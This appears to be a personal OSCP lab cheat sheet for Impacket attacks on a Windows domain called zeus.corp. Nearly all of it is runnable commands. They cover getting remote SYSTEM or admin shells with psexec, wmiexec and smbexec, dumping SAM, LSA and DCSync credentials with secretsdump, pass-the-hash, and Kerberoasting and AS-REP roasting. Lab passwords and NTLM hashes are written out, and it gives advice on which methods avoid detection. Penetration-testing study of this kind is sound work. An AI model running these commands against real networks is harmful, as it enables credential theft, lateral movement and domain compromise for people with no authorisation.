# Impacket — Windows Attack Scripts
# Run all commands from: ~/impacket-latest/examples/
# Format: python3 <script>.py <domain>/<user>:<password>@<target>

---

## Universal Auth Syntax

All impacket scripts follow the same auth pattern:
```
# Password
python3 script.py domain/username:password@TARGET_IP

# Pass-the-Hash (use NTLM hash instead of password)
python3 script.py domain/username@TARGET_IP -hashes :NTLMHASH
# Note: format is LMHASH:NTHASH — if you only have NT, just put a colon before it

# Kerberos ticket (from ccache file)
export KRB5CCNAME=/path/to/ticket.ccache
python3 script.py domain/username@TARGET_IP -k -no-pass
```

---

## Remote Execution — Getting a Shell

These three all give you a shell but work differently under the hood.
Try them in order if one fails.

### psexec.py — Most reliable shell, noisy (writes a service binary to disk)
```
python3 psexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
python3 psexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```
- Gives a SYSTEM shell (highest privilege)
- Detected easily — writes a binary to ADMIN$
- Requires: local admin access

### wmiexec.py — Semi-interactive shell via WMI, stealthier than psexec
```
python3 wmiexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
python3 wmiexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```
- Runs as Administrator (not SYSTEM)
- Does NOT write a binary to disk — much stealthier
- Good fallback when psexec fails

### smbexec.py — Shell via SMB, no writable share needed
```
python3 smbexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
python3 smbexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```
- Similar to psexec but does NOT use RemComSvc
- Creates a local smbserver to receive output
- Useful when target has no writable share

### atexec.py — Single command via Task Scheduler (no interactive shell)
```
python3 atexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159 'whoami'
```
- Not a shell — executes ONE command and returns output
- Useful when you just need to grab a file or run one thing

### dcomexec.py — Shell via DCOM, alternative to wmiexec
```
python3 dcomexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
```
- Uses DCOM endpoints instead of WMI
- Another fallback option if wmiexec/psexec are blocked

---

## secretsdump.py — Dump Credentials

The most important impacket script for OSCP. Dumps SAM, LSA, cached creds.

### Dump everything from a regular machine (what we ran on CLIENT01)
```
python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
```

### Pass-the-Hash version
```
python3 secretsdump.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```

### DCSync — Dump ALL domain hashes from a Domain Controller (the holy grail)
```
python3 secretsdump.py zeus.corp/Administrator:password@DC_IP -just-dc-ntlm
```
- -just-dc-ntlm = only pull NTLM hashes (cleaner output)
- -just-dc = pull everything including Kerberos keys
- Only works against a DC, and only if your user has DCSync rights (usually Domain Admin)

### What secretsdump output means
```
# SAM hashes (local accounts on that machine)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
                                                    ^--- this part is the NTLM hash you use

# Cached domain logon (DCC2) — NOT usable for PTH, need to crack with hashcat -m 2100
ZEUS.CORP/o.foller:$DCC2$10240#o.foller#02b31594bda9e176c8cb8e3b8c9a9395

# LSA Secrets — plaintext passwords stored for services/scheduled tasks
zeus\o.foller:EarlyMorningFootball777    <- jackpot, use this directly
```

---

## Kerberos Scripts

### GetUserSPNs.py — Kerberoasting (request TGS tickets for service accounts)
```
python3 GetUserSPNs.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -request
```
- Finds service accounts with SPNs and requests their tickets
- Tickets can be cracked offline with hashcat (-m 13100)
- No special privileges needed — any domain user can do this

### GetNPUsers.py — AS-REP Roasting (attack accounts with no pre-auth required)
```
python3 GetNPUsers.py zeus.corp/ -usersfile users.txt -dc-ip 192.168.158.158 -no-pass
python3 GetNPUsers.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158
```
- Finds accounts that don't require Kerberos pre-authentication
- Returns crackable hashes (hashcat -m 18200)

### getTGT.py — Request a TGT ticket (used for Kerberos auth with other tools)
```
python3 getTGT.py zeus.corp/o.foller:EarlyMorningFootball777
python3 getTGT.py zeus.corp/o.foller -hashes :decca5b9babc228de4cedeb29a6b9abf
# After running, load the ticket:
export KRB5CCNAME=o.foller.ccache
```

### getST.py — Request a Service Ticket (used in delegation attacks)
```
python3 getST.py zeus.corp/o.foller:EarlyMorningFootball777 -spn cifs/TARGET -dc-ip 192.168.158.158
```

---

## Enumeration Scripts

### GetADUsers.py — List all domain users
```
python3 GetADUsers.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -all
```

### lookupsid.py — Enumerate users/groups by brute-forcing SIDs
```
python3 lookupsid.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.158
```

### rpcdump.py — List RPC services running on a target
```
python3 rpcdump.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.159
```

### smbclient.py — Browse SMB shares interactively
```
python3 smbclient.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.159
# Inside the shell: shares, use C$, ls, get filename, put filename
```

---

## Real Examples From This Lab
```
# What we ran (correct version):
python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159

# Get a shell on CLIENT01 as Eric:
python3 psexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159

# PTH with local admin hash against VM1 and VM3:
python3 psexec.py zeus.corp/Administrator@192.168.158.158 -hashes :a1fcb4118dfcbf52a53d6299aab57055
python3 psexec.py zeus.corp/Administrator@192.168.158.160 -hashes :a1fcb4118dfcbf52a53d6299aab57055

# Kerberoast the domain as o.foller:
python3 GetUserSPNs.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -request
```

---

## Quick Reference — Which Shell Script To Use?
```
psexec.py   -> SYSTEM shell, noisy, most reliable
wmiexec.py  -> Admin shell, stealthy, no disk writes
smbexec.py  -> Admin shell, no writable share needed
atexec.py   -> Single command only, no shell
dcomexec.py -> Admin shell, uses DCOM (last resort)
```